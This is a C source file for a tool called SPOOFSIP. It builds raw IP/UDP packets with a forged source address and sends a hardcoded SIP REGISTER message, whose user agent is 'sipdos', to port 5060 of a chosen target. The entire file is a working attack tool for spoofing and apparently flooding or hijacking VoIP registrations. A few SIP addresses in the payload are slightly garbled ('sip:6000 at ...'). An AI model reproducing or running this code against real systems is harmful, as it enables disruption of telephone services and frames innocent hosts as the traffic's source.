/* SPOOFSIP.C - Developed by Robert Hale - Release FEB 2011 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

#define UDPPORT 5060

char *message = "REGISTER sip:192.168.0.100:5060 SIP/2.0\n"
"Via: SIP/2.0/UDP 192.168.0.188;branch=z9hG4bKa4c6495f8\nTo: sipdos <sip:6000 at 192.168.0.100:5060>\n"
"From: sipdos <sip:6000 at 192.168.0.100:5060>;tag=e154d164425d784\nCall-ID: a917df615b074b81ea2ec43580799f6e@ 192.168.0.188\n"
"CSeq: 1219791964 REGISTER\nContact: sipdos <sip:6000@ 192.168.0.188>;expires=660\n"
"Allow: NOTIFY\nAllow: REFER\nAllow: OPTIONS\nAllow: INVITE\nAllow: ACK\nAllow: CANCEL\nAllow: BYE\n"
"Content-Length: 0\nUser-Agent: sipdos/1.5.0.0 MxSF/v3.2.5.20\n";

struct raw_packet_hdr {
        struct iphdr ip;                            
        struct udphdr udp;
};

struct raw_packet_hdr* packet;

void die(char *);
unsigned long int get_ip_addr(char*);
unsigned short checksum(unsigned short*,char);

int main(int argc,char** argv){

struct sockaddr_in sa;
int sock,packet_len;
char usage[] = {"spoofsip <SOURCE_IP> <DEST_IP>\n" }; 

char on = 1;

if(argc != 3)die(usage);

if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
        perror("socket");
        exit(1);
        }

sa.sin_addr.s_addr = get_ip_addr(argv[2]);
sa.sin_family = AF_INET;

packet_len = sizeof(struct raw_packet_hdr)+strlen(message)+4;
packet = calloc((size_t)1,(size_t)packet_len);

packet->ip.version = 4;
packet->ip.ihl = sizeof(struct iphdr) >> 2;
packet->ip.tos = 0;
packet->ip.tot_len = htons(packet_len);
packet->ip.id = htons(getpid() & 0xFFFF);
packet->ip.frag_off = 0;
packet->ip.ttl = 0x40;
packet->ip.protocol = IPPROTO_UDP;
packet->ip.check = 0;
packet->ip.saddr = get_ip_addr(argv[1]);
packet->ip.daddr = sa.sin_addr.s_addr;
packet->ip.check = checksum((unsigned short*)packet,sizeof(struct iphdr));

packet->udp.source = htons(UDPPORT);
packet->udp.dest = htons(UDPPORT);
packet->udp.len = htons(packet_len - sizeof(struct iphdr));
packet->udp.check = 0;  /* If you feel like screwing around with pseudo-headers
                        and stuff, you may of course calculate UDP checksum
                        as well.  I chose to leave it zero, it's usually OK */

sprintf((char*)packet+sizeof(struct raw_packet_hdr),"%s"
        ,message);

if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
        perror("setsockopt: IP_HDRINCL");
        exit(1);
        }

if(sendto(sock,packet,packet_len,0,(struct sockaddr*)&sa,sizeof(sa)) < 0){
        perror("sendto");
        exit(1);
        }
exit(0);
}

void die(char* str){
fprintf(stderr,"%s\n",str);
exit(1);
}

unsigned long int get_ip_addr(char* str){

struct hostent *hostp;
unsigned long int addr;

if( (addr = inet_addr(str)) == -1){
        if( (hostp = gethostbyname(str)))
                return *(unsigned long int*)(hostp->h_addr);
        else {
                fprintf(stderr,"unknown host %s\n",str);
                exit(1);
                }
        }
return addr;
}

unsigned short checksum(unsigned short* addr,char len){
register long sum = 0;

while(len > 1){
        sum += *addr++;
        len -= 2;
        }
while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);

return ~sum;
}
